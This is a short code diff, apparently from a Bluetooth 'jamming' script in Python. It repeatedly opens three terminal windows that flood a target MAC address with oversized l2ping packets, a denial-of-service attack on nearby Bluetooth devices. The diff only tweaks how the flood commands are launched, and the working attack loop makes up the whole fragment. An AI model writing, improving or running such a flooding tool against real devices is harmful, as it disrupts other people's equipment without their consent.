@@ -16,11 +16,10 @@ print("Start jamming...")
 delay = int(time)
 
 while delay != 0:
-
-    xterm_1 = "xterm -e 'timeout 2s l2ping -i hci0 -s 600 -f %s &'" % (mac)
-    xterm_2 = "xterm -e 'timeout 2s l2ping -i hci0 -s 600 -f %s &'" % (mac)
-    xterm_3 = "xterm -e 'timeout 2s l2ping -i hci0 -s 600 -f %s &'" % (mac)
-    subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE,shell=True)
-    subprocess.Popen(xterm_2, stdout=subprocess.PIPE, stderr=subprocess.PIPE,shell=True)
-    subprocess.Popen(xterm_3, stdout=subprocess.PIPE, stderr=subprocess.PIPE,shell=True)
+    xterm_1 = "xterm -e 'timeout 2s l2ping -i hci0 -s 600 -f %s '" % (mac)
+    xterm_2 = "xterm -e 'timeout 2s l2ping -i hci0 -s 600 -f %s '" % (mac)
+    xterm_3 = "xterm -e 'timeout 2s l2ping -i hci0 -s 600 -f %s '" % (mac)
+    subprocess.Popen(xterm_1, shell=True)
+    subprocess.Popen(xterm_2, shell=True)
+    subprocess.Popen(xterm_3, shell=True)
     delay -= 1
